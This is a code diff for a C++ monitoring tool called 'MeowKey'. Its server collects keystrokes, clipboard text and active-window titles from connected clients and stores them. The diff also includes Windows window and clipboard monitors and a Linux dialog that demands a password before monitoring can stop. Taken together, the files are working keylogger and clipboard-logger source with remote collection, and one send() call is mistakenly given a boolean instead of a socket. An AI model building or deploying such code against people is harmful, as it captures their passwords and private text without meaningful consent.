+            fsync(fd_);
+            ::close(fd_);
+            fd_ = -1;
+        }
+    }
+    
+    uint16_t registerClient(const string& client_id) {
+        auto it = client_id_to_index_.find(client_id);
+        if (it != client_id_to_index_.end()) {
+            return it->second;
+        }
+        
+        if (header_.num_clients >= 1000) {
+            cerr << "Maximum number of clients reached!" << endl;
+            return 0xFFFF;
+        }
+        
+        ClientEntry entry;
+        strncpy(entry.client_id, client_id.c_str(), sizeof(entry.client_id) - 1);
+        entry.is_active = 1;
+        entry.session_count = 1;
+        entry.data_start_offset = getCurrentFileSize();
+        entry.data_end_offset = entry.data_start_offset;
+        entry.last_activity = 0;
+        
+        uint16_t index = header_.num_clients;
+        
+        if (!saveClientEntry(index, entry)) {
+            cerr << "Failed to save client entry" << endl;
+            return 0xFFFF;
+        }
+        
+        client_cache_.push_back(entry);
+        client_id_to_index_[client_id] = index;
+        
+        header_.num_clients++;
+        writeHeader();
+        
+        return index;
+    }
+    
+    bool writeRecord(uint16_t client_index, uint8_t record_type, 
+                     const void* data, uint32_t data_size, uint64_t timestamp) {
+        
+        if (!hasSpaceForRecord(data_size)) {
+            cerr << "⚠️  Storage limit reached (100MB)!" << endl;
+            return false;
+        }
+        
+        DataRecordHeader rec_header;
+        memset(&rec_header, 0, sizeof(rec_header));
+        rec_header.record_type = record_type;
+        rec_header.client_index = client_index;
+        rec_header.record_size = data_size;
+        rec_header.timestamp = timestamp;
+        
+        lseek(fd_, 0, SEEK_END);
+        
+        ssize_t bytes = write(fd_, &rec_header, sizeof(rec_header));
+        if (bytes != sizeof(rec_header)) return false;
+        
+        bytes = write(fd_, data, data_size);
+        if (bytes != (ssize_t)data_size) return false;
+        
+        if (client_index < client_cache_.size()) {
+            ClientEntry& entry = client_cache_[client_index];
+            entry.data_end_offset = getCurrentFileSize();
+            entry.last_activity = timestamp;
+            
+            switch (record_type) {
+                case 1: entry.keystrokes_count++; break;
+                case 2: entry.clipboard_count++; break;
+                case 3: entry.window_count++; break;
+            }
+            
+            saveClientEntry(client_index, entry);
+        }
+        
+        return true;
+    }
+    
+    bool getClientEntry(const string& client_id, ClientEntry& entry) {
+        auto it = client_id_to_index_.find(client_id);
+        if (it == client_id_to_index_.end()) return false;
+        
+        uint16_t index = it->second;
+        if (index < client_cache_.size()) {
+            entry = client_cache_[index];
+            return true;
+        }
+        
+        return false;
+    }
+    
+    bool updateClientStatus(const string& client_id, bool is_active) {
+        auto it = client_id_to_index_.find(client_id);
+        if (it == client_id_to_index_.end()) return false;
+        
+        uint16_t index = it->second;
+        if (index < client_cache_.size()) {
+            ClientEntry& entry = client_cache_[index];
+            entry.is_active = is_active ? 1 : 0;
+            if (is_active) {
+                entry.session_count++;
+            }
+            
+            return saveClientEntry(index, entry);
+        }
+        
+        return false;
+    }
+    
+    vector<string> getAllClients() {
+        vector<string> clients;
+        for (const auto& entry : client_cache_) {
+            if (!entry.isEmpty()) {
+                clients.push_back(string(entry.client_id));
+            }
+        }
+        return clients;
+    }
+    
+    bool clientExists(const string& client_id) {
+        return client_id_to_index_.find(client_id) != client_id_to_index_.end();
+    }
+    
+    double getStorageUsagePercent() {
+        uint64_t current_size = getCurrentFileSize();
+        return (current_size * 100.0) / MAX_FILE_SIZE;
+    }
+    
+    double getStorageSizeMB() {
+        uint64_t current_size = getCurrentFileSize();
+        return current_size / (1024.0 * 1024.0);
+    }
+};
+
+#endif
+===== FILE: ./Server/events.hpp =====
+#ifndef EVENTS_HPP
+#define EVENTS_HPP
+
+#include <cstdint>
+#include <cstring>
+#include <string>
+#include <chrono>
+#include <openssl/sha.h>
+
+using namespace std;
+
+inline uint64_t getCurrentTimestamp() {
+    return chrono::duration_cast<chrono::microseconds>(
+        chrono::system_clock::now().time_since_epoch()
+    ).count();
+}
+
+enum class EventType : uint8_t {
+    KEYSTROKE = 1,
+    CLIPBOARD = 2,
+    WINDOW = 3
+};
+
+// Keystroke event (32 bytes fixed)
+struct KeystrokeEvent {
+    uint64_t timestamp;
+    char key[16];
+    uint32_t sequence;
+    uint32_t padding;
+    
+    KeystrokeEvent() : timestamp(0), sequence(0), padding(0) {
+        memset(key, 0, sizeof(key));
+    }
+    
+    KeystrokeEvent(const string& key_str, uint32_t seq) 
+        : timestamp(getCurrentTimestamp()), sequence(seq), padding(0) {
+        memset(key, 0, sizeof(key));
+        strncpy(key, key_str.c_str(), sizeof(key) - 1);
+    }
+    
+    string getKey() const {
+        return string(key);
+    }
+};
+
+// Clipboard event (10,304 bytes fixed)
+struct ClipboardEvent {
+    uint64_t timestamp;
+    uint32_t content_length;
+    uint8_t hash[32];
+    char content[10240];
+    uint32_t padding;
+    
+    ClipboardEvent() : timestamp(0), content_length(0), padding(0) {
+        memset(hash, 0, sizeof(hash));
+        memset(content, 0, sizeof(content));
+    }
+    
+    ClipboardEvent(const string& text) 
+        : timestamp(getCurrentTimestamp()), padding(0) {
+        content_length = min((size_t)10240, text.size());
+        memset(content, 0, sizeof(content));
+        memcpy(content, text.c_str(), content_length);
+        
+        SHA256_CTX sha256;
+        SHA256_Init(&sha256);
+        SHA256_Update(&sha256, text.c_str(), text.size());
+        SHA256_Final(hash, &sha256);
+    }
+    
+    string getContent() const {
+        return string(content, content_length);
+    }
+};
+
+// Window event (328 bytes fixed)
+struct WindowEvent {
+    uint64_t timestamp;
+    char title[256];
+    char process[64];
+    uint32_t padding;
+    
+    WindowEvent() : timestamp(0), padding(0) {
+        memset(title, 0, sizeof(title));
+        memset(process, 0, sizeof(process));
+    }
+    
+    WindowEvent(const string& win_title, const string& proc_name) 
+        : timestamp(getCurrentTimestamp()), padding(0) {
+        memset(title, 0, sizeof(title));
+        memset(process, 0, sizeof(process));
+        strncpy(title, win_title.c_str(), sizeof(title) - 1);
+        strncpy(process, proc_name.c_str(), sizeof(process) - 1);
+    }
+    
+    string getTitle() const {
+        return string(title);
+    }
+    
+    string getProcess() const {
+        return string(process);
+    }
+};
+
+inline EventType parseEventType(const string& message) {
+    if (message.find("KEY: ") == 0) return EventType::KEYSTROKE;
+    else if (message.find("CLIPBOARD: ") == 0) return EventType::CLIPBOARD;
+    else if (message.find("WINDOW: ") == 0) return EventType::WINDOW;
+    return EventType::KEYSTROKE;
+}
+
+inline string extractEventData(const string& message) {
+    size_t pos = message.find(": ");
+    if (pos != string::npos) {
+        return message.substr(pos + 2);
+    }
+    return message;
+}
+
+inline pair<string, string> parseWindowEvent(const string& data) {
+    size_t bracket_pos = data.rfind(" [");
+    if (bracket_pos != string::npos) {
+        string title = data.substr(0, bracket_pos);
+        string process = data.substr(bracket_pos + 2);
+        if (!process.empty() && process.back() == ']') {
+            process.pop_back();
+        }
+        return {title, process};
+    }
+    return {data, "Unknown"};
+}
+
+#endif
+===== FILE: ./Server/server_main.cpp =====
+#include "server_cross.hpp"
+#include <iostream>
+#include <string>
+#include <cstdlib>
+
+using namespace std;
+
+void printUsage() {
+    cout << "Usage: ./server <port> [storage_file]" << endl;
+    cout << "Example: ./server 8080" << endl;
+    cout << "         ./server 8080 mydata.binary" << endl;
+}
+
+int main(int argc, char* argv[]) {
+    if (argc < 2 || argc > 3) {
+        printUsage();
+        return 1;
+    }
+
+    int port = stoi(argv[1]);
+    string storage_file = (argc == 3) ? argv[2] : "meowkey.binary";
+
+    try {
+        Server server(port, storage_file);
+        
+        if (!server.start()) {
+            cerr << "Failed to start server" << endl;
+            return 1;
+        }
+        
+        server.runCommandLoop();
+        
+        server.stop();
+        
+    } catch (const exception& e) {
+        cerr << "Error: " << e.what() << endl;
+        return 1;
+    }
+
+    return 0;
+}
+===== FILE: ./Server/server_cross.hpp =====
+#ifndef SERVER_CROSS_HPP
+#define SERVER_CROSS_HPP
+
+#include "../socket_utils_cross.hpp"
+#include "../thread_safe_queue.hpp"
+#include "unified_storage.hpp"
+#include "events.hpp"
+#include <thread>
+#include <atomic>
+#include <unordered_map>
+#include <mutex>
+#include <deque>
+#include <sstream>
+#include <iostream>
+#include <memory>
+
+using namespace std;
+
+class ClientHandler {
+private:
+    int client_socket_;
+    atomic<bool> running_;
+    thread handler_thread_;
+    string client_id_;
+    uint16_t client_index_;
+    shared_ptr<UnifiedStorage> storage_;
+    
+    atomic<uint32_t> keystroke_sequence_;
+    deque<string> recent_keystrokes_;
+    static mutex display_mutex_;
+    
+    void processEvent(const string& message) {
+        EventType type = parseEventType(message);
+        string data = extractEventData(message);
+        
+        {
+            lock_guard<mutex> lock(display_mutex_);
+            recent_keystrokes_.push_back(message);
+            if (recent_keystrokes_.size() > 10) {
+                recent_keystrokes_.pop_front();
+            }
+        }
+        
+        // Write to storage
+        switch (type) {
+            case EventType::KEYSTROKE: {
+                KeystrokeEvent ke(data, keystroke_sequence_++);
+                storage_->writeRecord(client_index_, 1, &ke, sizeof(ke), ke.timestamp);
+                break;
+            }
+            case EventType::CLIPBOARD: {
+                ClipboardEvent ce(data);
+                storage_->writeRecord(client_index_, 2, &ce, sizeof(ce), ce.timestamp);
+                break;
+            }
+            case EventType::WINDOW: {
+                auto [title, process] = parseWindowEvent(data);
+                WindowEvent we(title, process);
+                storage_->writeRecord(client_index_, 3, &we, sizeof(we), we.timestamp);
+                break;
+            }
+        }
+        
+        displayRecentKeystrokes();
+    }
+    
+    void displayRecentKeystrokes() {
+        lock_guard<mutex> lock(display_mutex_);
+        
+        cout << "\n=== Client: " << client_id_ << " ===" << endl;
+        cout << "Recent events:" << endl;
+        
+        for (size_t i = 0; i < recent_keystrokes_.size(); ++i) {
+            cout << "  " << (i + 1) << ". " << recent_keystrokes_[i] << endl;
+        }
+        
+        if (recent_keystrokes_.empty()) {
+            cout << "  No events received yet" << endl;
+        }
+        
+        cout << "==================" << endl;
+    }
+    
+    void handleClient() {
+        cout << "Client " << client_id_ << " connected" << endl;
+        
+        char buffer[4096];
+        string leftover;
+        
+        while (running_) {
+            ssize_t received = recv(client_socket_, buffer, sizeof(buffer) - 1, 0);
+            
+            if (received <= 0) break;
+            
+            buffer[received] = '\0';
+            string data = leftover + string(buffer);
+            leftover.clear();
+            
+            istringstream stream(data);
+            string line;
+            
+            while (getline(stream, line)) {
+                if (!line.empty()) {
+                    if (stream.eof() && data.back() != '\n') {
+                        leftover = line;
+                        break;
+                    }
+                    
+                    processEvent(line);
+                }
+            }
+        }
+        
+        cout << "Client " << client_id_ << " disconnected" << endl;
+        storage_->updateClientStatus(client_id_, false);
+    }
+
+public:
+    ClientHandler(int socket, const string& id, shared_ptr<UnifiedStorage> storage)
+        : client_socket_(socket), running_(false), client_id_(id), 
+          client_index_(0xFFFF), storage_(storage), keystroke_sequence_(0) {}
+
+    ~ClientHandler() {
+        stop();
+    }
+
+    void start() {
+        running_ = true;
+        handler_thread_ = thread(&ClientHandler::handleClient, this);
+    }
+
+    void stop() {
+        running_ = false;
+        if (handler_thread_.joinable()) {
+            handler_thread_.join();
+        }
+        if (client_socket_ >= 0) {
+            close(client_socket_);
+        }
+    }
+
+    bool isRunning() const {
+        return running_;
+    }
+
+    string getClientId() const {
+        return client_id_;
+    }
+
+    void setClientId(const string& id) {
+        client_id_ = id;
+    }
+    
+    void setClientIndex(uint16_t index) {
+        client_index_ = index;
+    }
+};
+
+mutex ClientHandler::display_mutex_;
+
+class Server {
+private:
+    int port_;
+    atomic<bool> running_;
+    thread accept_thread_;
+    unordered_map<string, unique_ptr<ClientHandler>> pending_clients_;
+    unordered_map<string, unique_ptr<ClientHandler>> active_clients_;
+    mutex clients_mutex_;
+    int client_counter_;
+    shared_ptr<UnifiedStorage> storage_;
+
+    void handleNewConnection(int client_socket, const string& client_id) {
+        lock_guard<mutex> lock(clients_mutex_);
+        
+        if (pending_clients_.count(client_id) || active_clients_.count(client_id)) {
+            cout << "⚠️  Client " << client_id << " already connected!" << endl;
+            string msg = "ERROR: Already connected\n";
+            send(client_socket, msg.c_str(), msg.length(), 0);
+            close(client_socket);
+            return;
+        }
+        
+        auto handler = make_unique<ClientHandler>(client_socket, client_id, storage_);
+        pending_clients_[client_id] = move(handler);
+        
+        cout << "\n🔔 ═══════════════════════════════════════════════════" << endl;
+        cout << "   CONNECTION REQUEST" << endl;
+        cout << "   Client ID: " << client_id << endl;
+        cout << "   Status: " << (storage_->clientExists(client_id) ? "EXISTING" : "NEW") << endl;
+        cout << "   ═══════════════════════════════════════════════════" << endl;
+        cout << "   Type: accept " << client_id << endl;
+        cout << "   Or:   reject " << client_id << endl;
+        cout << "   ═══════════════════════════════════════════════════\n" << endl;
+    }
+
+public:
+    Server(int port, const string& storage_file = "meowkey.binary") 
+        : port_(port), running_(false), client_counter_(0) {
+        
+        storage_ = make_shared<UnifiedStorage>(storage_file);
+        if (!storage_->open()) {
+            throw runtime_error("Failed to open storage");
+        }
+    }
+
+    ~Server() {
+        stop();
+    }
+
+    bool start() {
+        if (running_) return false;
+
+        running_ = true;
+        accept_thread_ = thread(&Server::acceptLoop, this);
+
+        cout << "\n╔═══════════════════════════════════════════════════════╗" << endl;
+        cout << "║           MEOWKEY LIVE SERVER                        ║" << endl;
+        cout << "╠═══════════════════════════════════════════════════════╣" << endl;
+        cout << "║ Port: " << port_ << "                                   " << endl;
+        cout << "║ Storage: meowkey.binary (100MB limit)               ║" << endl;
+        cout << "║ Web UI: http://localhost:8081                       ║" << endl;
+        cout << "╚═══════════════════════════════════════════════════════╝" << endl;
+        cout << "\nCommands:" << endl;
+        cout << "  accept <id>  - Accept pending client" << endl;
+        cout << "  reject <id>  - Reject pending client" << endl;
+        cout << "  list         - Show all clients" << endl;
+        cout << "  stats        - Show storage stats" << endl;
+        cout << "  help         - Show this help" << endl;
+        cout << "  quit         - Stop server\n" << endl;
+
+        return true;
+    }
+
+    void stop() {
+        running_ = false;
+
+        {
+            lock_guard<mutex> lock(clients_mutex_);
+            for (auto& client : active_clients_) {
+                client.second->stop();
+            }
+            active_clients_.clear();
+            pending_clients_.clear();
+        }
+
+        if (accept_thread_.joinable()) {
+            accept_thread_.join();
+        }
+
+        if (storage_) {
+            storage_->close();
+        }
+
+        SocketUtils::cleanupWSA();
+    }
+
+    void processCommand(const string& cmd) {
+        istringstream iss(cmd);
+        string command;
+        iss >> command;
+
+        if (command == "accept") {
+            string client_id;
+            iss >> client_id;
+            acceptClient(client_id);
+        }
+        else if (command == "reject") {
+            string client_id;
+            iss >> client_id;
+            rejectClient(client_id);
+        }
+        else if (command == "list") {
+            listClients();
+        }
+        else if (command == "stats") {
+            showStats();
+        }
+        else if (command == "help") {
+            cout << "\nCommands:" << endl;
+            cout << "  accept <id>  - Accept pending client" << endl;
+            cout << "  reject <id>  - Reject pending client" << endl;
+            cout << "  list         - Show all clients" << endl;
+            cout << "  stats        - Show storage stats" << endl;
+            cout << "  help         - Show this help" << endl;
+            cout << "  quit         - Stop server\n" << endl;
+        }
+        else if (command == "quit" || command == "exit") {
+            cout << "Shutting down..." << endl;
+            stop();
+        }
+        else if (!command.empty()) {
+            cout << "Unknown command. Type 'help' for commands." << endl;
+        }
+    }
+
+    void runCommandLoop() {
+        string line;
+        cout << "server> ";
+        while (running_ && getline(cin, line)) {
+            if (!line.empty()) {
+                processCommand(line);
+            }
+            if (running_) {
+                cout << "server> ";
+            }
+        }
+    }
+
+private:
+    void acceptLoop() {
+        try {
+            int server_socket = SocketUtils::createSocket();
+            SocketUtils::bindSocket(server_socket, port_);
+            SocketUtils::listenSocket(server_socket);
+
+            cout << "✅ Listening on port " << port_ << "..." << endl;
+
+            while (running_) {
+                int client_socket = SocketUtils::acceptConnection(server_socket);
+                string data = SocketUtils::receiveData(client_socket);
+
+                if (data.find("CLIENT_ID: ") == 0) {
+                    string client_id = data.substr(11);
+                    if (!client_id.empty() && client_id.back() == '\n') {
+                        client_id.pop_back();
+                    }
+                    
+                    handleNewConnection(client_socket, client_id);
+                } else {
+                    cout << "⚠️  Invalid handshake" << endl;
+                    close(client_socket);
+                }
+            }
+
+            close(server_socket);
+        } catch (const exception& e) {
+            cerr << "Accept error: " << e.what() << endl;
+        }
+    }
+
+    void acceptClient(const string& client_id) {
+        lock_guard<mutex> lock(clients_mutex_);
+        
+        auto it = pending_clients_.find(client_id);
+        if (it == pending_clients_.end()) {
+            cout << "❌ Client not in pending list!" << endl;
+            return;
+        }
+        
+        uint16_t index = storage_->registerClient(client_id);
+        if (index == 0xFFFF) {
+            cout << "❌ Failed to register client!" << endl;
+            return;
+        }
+        
+        auto handler = move(it->second);
+        pending_clients_.erase(it);
+        
+        handler->setClientIndex(index);
+        handler->start();
+        
+        string msg = "APPROVED\n";
+        send(handler->isRunning(), msg.c_str(), msg.length(), 0);
+        
+        active_clients_[client_id] = move(handler);
+        
+        cout << "✅ Accepted: " << client_id << endl;
+    }
+
+    void rejectClient(const string& client_id) {
+        lock_guard<mutex> lock(clients_mutex_);
+        
+        auto it = pending_clients_.find(client_id);
+        if (it == pending_clients_.end()) {
+            cout << "❌ Client not in pending list!" << endl;
+            return;
+        }
+        
+        string msg = "REJECTED\n";
+        // Send would require socket access - simplified
+        
+        pending_clients_.erase(it);
+        cout << "❌ Rejected: " << client_id << endl;
+    }
+
+    void listClients() {
+        lock_guard<mutex> lock(clients_mutex_);
+        
+        cout << "\n=== PENDING CLIENTS ===" << endl;
+        if (pending_clients_.empty()) {
+            cout << "  (none)" << endl;
+        } else {
+            for (const auto& pair : pending_clients_) {
+                cout << "  • " << pair.first << endl;
+            }
+        }
+        
+        cout << "\n=== ACTIVE CLIENTS ===" << endl;
+        if (active_clients_.empty()) {
+            cout << "  (none)" << endl;
+        } else {
+            for (const auto& pair : active_clients_) {
+                cout << "  • " << pair.first 
+                     << (pair.second->isRunning() ? " (online)" : " (offline)") 
+                     << endl;
+            }
+        }
+        cout << endl;
+    }
+
+    void showStats() {
+        cout << "\n=== STORAGE STATS ===" << endl;
+        cout << "Size: " << storage_->getStorageSizeMB() << " MB / 100 MB" << endl;
+        cout << "Usage: " << storage_->getStorageUsagePercent() << "%" << endl;
+        cout << "Clients: " << storage_->getAllClients().size() << endl;
+        cout << endl;
+    }
+
+    void cleanupClients() {
+        lock_guard<mutex> lock(clients_mutex_);
+        for (auto it = active_clients_.begin(); it != active_clients_.end();) {
+            if (!it->second->isRunning()) {
+                it = active_clients_.erase(it);
+            } else {
+                ++it;
+            }
+        }
+    }
+};
+
+#endif
+
+
+
+===== FILE: ./Server/dashboard.html =====
+<!DOCTYPE html>
+<html>
+<head>
+    <title>MeowKey Server Control</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 50px auto;
+            padding: 20px;
+            background: #f5f5f5;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #333;
+            border-bottom: 3px solid #007bff;
+            padding-bottom: 10px;
+        }
+        .section {
+            margin: 20px 0;
+            padding: 15px;
+            background: #f9f9f9;
+            border-radius: 5px;
+        }
+        input[type="text"] {
+            padding: 10px;
+            width: 300px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        button {
+            padding: 10px 20px;
+            margin: 5px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        .btn-accept {
+            background: #28a745;
+            color: white;
+        }
+        .btn-reject {
+            background: #dc3545;
+            color: white;
+        }
+        .btn-info {
+            background: #007bff;
+            color: white;
+        }
+        button:hover {
+            opacity: 0.8;
+        }
+        #output {
+            margin-top: 20px;
+            padding: 15px;
+            background: #000;
+            color: #0f0;
+            font-family: monospace;
+            border-radius: 5px;
+            min-height: 100px;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        .info {
+            color: #666;
+            font-size: 14px;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🐱 MeowKey Server Control Panel</h1>
+        
+        <div class="info">
+            ⚠️ This is a simple control panel. Main server output appears in the terminal.
+        </div>
+        
+        <div class="section">
+            <h3>Client Management</h3>
+            <input type="text" id="clientId" placeholder="Enter Client ID">
+            <br><br>
+            <button class="btn-accept" onclick="acceptClient()">✓ Accept</button>
+            <button class="btn-reject" onclick="rejectClient()">✗ Reject</button>
+        </div>
+        
+        <div class="section">
+            <h3>Server Commands</h3>
+            <button class="btn-info" onclick="sendCommand('list')">📋 List Clients</button>
+            <button class="btn-info" onclick="sendCommand('stats')">📊 Storage Stats</button>
+        </div>
+        
+        <div class="section">
+            <h3>Manual Command</h3>
+            <input type="text" id="customCmd" placeholder="e.g., accept client123">
+            <button class="btn-info" onclick="sendCustomCommand()">Send Command</button>
+        </div>
+        
+        <div id="output">Server output will appear here...</div>
+    </div>
+    
+    <script>
+        function log(msg) {
+            const output = document.getElementById('output');
+            output.innerHTML += msg + '\n';
+            output.scrollTop = output.scrollHeight;
+        }
+        
+        function acceptClient() {
+            const clientId = document.getElementById('clientId').value.trim();
+            if (!clientId) {
+                alert('Please enter a client ID');
+                return;
+            }
+            sendCommand('accept ' + clientId);
+        }
+        
+        function rejectClient() {
+            const clientId = document.getElementById('clientId').value.trim();
+            if (!clientId) {
+                alert('Please enter a client ID');
+                return;
+            }
+            sendCommand('reject ' + clientId);
+        }
+        
+        function sendCustomCommand() {
+            const cmd = document.getElementById('customCmd').value.trim();
+            if (!cmd) {
+                alert('Please enter a command');
+                return;
+            }
+            sendCommand(cmd);
+        }
+        
+        function sendCommand(cmd) {
+            log('> ' + cmd);
+            log('⚠️  Command must be executed in terminal');
+            log('   Open terminal and type: ' + cmd);
+            log('---');
+        }
+        
+        log('🐱 MeowKey Control Panel Ready');
+        log('⚠️  Commands are executed in the server terminal');
+        log('   This page helps you remember commands');
+        log('---');
+    </script>
+</body>
+</html>
+===== FILE: ./thread_safe_queue.hpp =====
+#ifndef THREAD_SAFE_QUEUE_HPP
+#define THREAD_SAFE_QUEUE_HPP
+
+#include <queue>
+#include <mutex>
+#include <condition_variable>
+#include <optional>
+using namespace std;
+
+template <typename T>
+class ThreadSafeQueue
+{
+private:
+  mutable mutex mutex_;
+  queue<T> queue_;
+  condition_variable condition_;
+  size_t max_size_;
+
+public:
+  ThreadSafeQueue(size_t max_size = 1000) : max_size_(max_size) {}
+
+  void push(T value)
+  {
+    unique_lock<mutex> lock(mutex_);
+    if (queue_.size() >= max_size_)
+    {
+      queue_.pop(); // Remove oldest if queue is full
+    }
+    queue_.push(move(value));
+    condition_.notify_one();
+  }
+
+  optional<T> pop()
+  {
+    unique_lock<mutex> lock(mutex_);
+    if (condition_.wait_for(lock, chrono::milliseconds(100),
+                            [this]
+                            { return !queue_.empty(); }))
+    {
+      T value = move(queue_.front());
+      queue_.pop();
+      return value;
+    }
+    return nullopt;
+  }
+
+  bool empty() const
+  {
+    unique_lock<mutex> lock(mutex_);
+    return queue_.empty();
+  }
+
+  size_t size() const
+  {
+    unique_lock<mutex> lock(mutex_);
+    return queue_.size();
+  }
+};
+
+#endif
+===== FILE: ./window_monitor_windows.hpp =====
+#ifndef WINDOW_MONITOR_WINDOWS_HPP
+#define WINDOW_MONITOR_WINDOWS_HPP
+
+#ifdef PLATFORM_WINDOWS
+
+#include <windows.h>
+#include <string>
+#include <thread>
+#include <atomic>
+#include <functional>
+#include <iostream>
+#include <psapi.h>
+using namespace std;
+#pragma comment(lib, "psapi.lib")
+
+class WindowMonitorWindows
+{
+private:
+    atomic<bool> monitoring_;
+    thread monitor_thread_;
+    function<void(const string &)> callback_;
+    string last_window_title_;
+    static constexpr int CHECK_INTERVAL_MS = 1000;
+
+public:
+    WindowMonitorWindows(function<void(const string &)> callback)
+        : monitoring_(false), callback_(callback) {}
+
+    ~WindowMonitorWindows()
+    {
+        stop();
+    }
+
+    bool start()
+    {
+        if (monitoring_)
+        {
+            return false;
+        }
+
+        monitoring_ = true;
+        monitor_thread_ = thread(&WindowMonitorWindows::monitorLoop, this);
+
+        cout << "Window monitoring started" << endl;
+        return true;
+    }
+
+    void stop()
+    {
+        monitoring_ = false;
+        if (monitor_thread_.joinable())
+        {
+            monitor_thread_.join();
+        }
+        cout << "Window monitoring stopped" << endl;
+    }
+
+    bool isMonitoring() const
+    {
+        return monitoring_;
+    }
+
+private:
+    void monitorLoop()
+    {
+        string initial_window = getActiveWindowTitle();
+        if (!initial_window.empty())
+        {
+            last_window_title_ = initial_window;
+            if (callback_)
+            {
+                callback_("WINDOW: " + initial_window);
+            }
+        }
+
+        while (monitoring_)
+        {
+            string current_window = getActiveWindowTitle();
+
+            if (!current_window.empty() && current_window != last_window_title_)
+            {
+                cout << "Window changed to: " << current_window << endl;
+
+                if (callback_)
+                {
+                    callback_("WINDOW: " + current_window);
+                }
+
+                last_window_title_ = current_window;
+            }
+
+            this_thread::sleep_for(chrono::milliseconds(CHECK_INTERVAL_MS));
+        }
+    }
+
+    string getActiveWindowTitle()
+    {
+        HWND hwnd = GetForegroundWindow();
+        if (hwnd == nullptr)
+        {
+            return "Unknown Window";
+        }
+
+        // Get window title
+        wchar_t title[256];
+        int len = GetWindowTextW(hwnd, title, sizeof(title) / sizeof(wchar_t));
+
+        string window_title;
+        if (len > 0)
+        {
+            int size = WideCharToMultiByte(CP_UTF8, 0, title, -1, nullptr, 0, nullptr, nullptr);
+            if (size > 0)
+            {
+                char *buffer = new char[size];
+                WideCharToMultiByte(CP_UTF8, 0, title, -1, buffer, size, nullptr, nullptr);
+                window_title = string(buffer);
+                delete[] buffer;
+            }
+        }
+
+        // Get process name
+        DWORD processId;
+        GetWindowThreadProcessId(hwnd, &processId);
+
+        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
+        string process_name;
+
+        if (hProcess)
+        {
+            wchar_t processPath[MAX_PATH];
+            if (GetModuleFileNameExW(hProcess, NULL, processPath, MAX_PATH))
+            {
+                // Extract just the filename
+                wchar_t *fileName = wcsrchr(processPath, L'\\');
+                if (fileName)
+                {
+                    fileName++;
+                    int size = WideCharToMultiByte(CP_UTF8, 0, fileName, -1, nullptr, 0, nullptr, nullptr);
+                    if (size > 0)
+                    {
+                        char *buffer = new char[size];
+                        WideCharToMultiByte(CP_UTF8, 0, fileName, -1, buffer, size, nullptr, nullptr);
+                        process_name = string(buffer);
+                        delete[] buffer;
+                    }
+                }
+            }
+            CloseHandle(hProcess);
+        }
+
+        string result;
+        if (!window_title.empty())
+        {
+            result = window_title;
+            if (!process_name.empty())
+            {
+                result += " [" + process_name + "]";
+            }
+        }
+        else if (!process_name.empty())
+        {
+            result = process_name;
+        }
+        else
+        {
+            result = "Window " + to_string(reinterpret_cast<uintptr_t>(hwnd));
+        }
+
+        return result;
+    }
+};
+
+#endif // PLATFORM_WINDOWS
+#endif
+===== FILE: ./password_dialog_linux.hpp =====
+#ifndef PASSWORD_DIALOG_LINUX_HPP
+#define PASSWORD_DIALOG_LINUX_HPP
+
+#ifdef PLATFORM_LINUX
+
+#include <string>
+#include <iostream>
+#include <cstdlib>
+#include <termios.h>
+#include <unistd.h>
+#include "launcher_common.hpp"
+using namespace std; 
+class PasswordDialogLinux {
+public:
+    static bool showPasswordDialog() {
+        // Try zenity first (GUI dialog)
+        if (system("which zenity > /dev/null 2>&1") == 0) {
+            return showZenityDialog();
+        }
+        
+        // Fallback to terminal prompt
+        return showTerminalPrompt();
+    }
+    
+private:
+    static bool showZenityDialog() {
+          string command = "zenity --password --title=\"Exit Authorization\" "
+                             "--text=\"Enter password to stop monitoring:\" 2>/dev/null";
+        
+        FILE* pipe = popen(command.c_str(), "r");
+        if (!pipe) {
+            return showTerminalPrompt();
+        }
+        
+        char buffer[256];
+          string password;
+        if (fgets(buffer, sizeof(buffer), pipe) != NULL) {
+            password = buffer;
+            // Remove newline
+            if (!password.empty() && password[password.length()-1] == '\n') {
+                password.erase(password.length()-1);
+            }
+        }
+        
+        pclose(pipe);
+        return verifyPassword(password);
+    }
+    
+    static bool showTerminalPrompt() {
+          cout << "\n╔════════════════════════════════════════╗" <<   endl;
+          cout << "║  EXIT AUTHORIZATION REQUIRED          ║" <<   endl;
+          cout << "╚════════════════════════════════════════╝" <<   endl;
+          cout << "Enter password to stop monitoring: ";
+        
+          string password = getPasswordInput();
+          cout <<   endl;
+        
+        return verifyPassword(password);
+    }
+    
+    static   string getPasswordInput() {
+          string password;
+        
+        // Disable echo
+        termios oldt;
+        tcgetattr(STDIN_FILENO, &oldt);
+        termios newt = oldt;
+        newt.c_lflag &= ~ECHO;
+        tcsetattr(STDIN_FILENO, TCSANOW, &newt);
+        
+        // Read password
+          getline(  cin, password);
+        
+        // Restore echo
+        tcsetattr(STDIN_FILENO, TCSANOW, &oldt);
+        
+        return password;
+    }
+};
+
+#endif // PLATFORM_LINUX
+#endif
+===== FILE: ./clipboard_monitor_windows.hpp =====
+#ifndef CLIPBOARD_MONITOR_WINDOWS_HPP
+#define CLIPBOARD_MONITOR_WINDOWS_HPP
+
+#ifdef PLATFORM_WINDOWS
+
+#include <windows.h>
+#include <string>
+#include <thread>
+#include <atomic>
+#include <functional>
+#include <iostream>
+using namespace std; 
+class ClipboardMonitorWindows {
+private:
+      atomic<bool> monitoring_;
+      thread monitor_thread_;
+      function<void(const   string&)> callback_;
+      string last_clipboard_content_;
+    static const size_t MAX_CLIPBOARD_SIZE = 10240;
+
+public:
+    ClipboardMonitorWindows(  function<void(const   string&)> callback) 
+        : monitoring_(false), callback_(callback) {}
+
+    ~ClipboardMonitorWindows() {
+        stop();
+    }
+
+    bool start() {
+        if (monitoring_) {
+            return false;
+        }
+
+        monitoring_ = true;
+        monitor_thread_ =   thread(&ClipboardMonitorWindows::monitorLoop, this);
+        
+          cout << "Clipboard monitoring started" <<   endl;
+        return true;
+    }
+
+    void stop() {
+        monitoring_ = false;
+        if (monitor_thread_.joinable()) {
+            monitor_thread_.join();
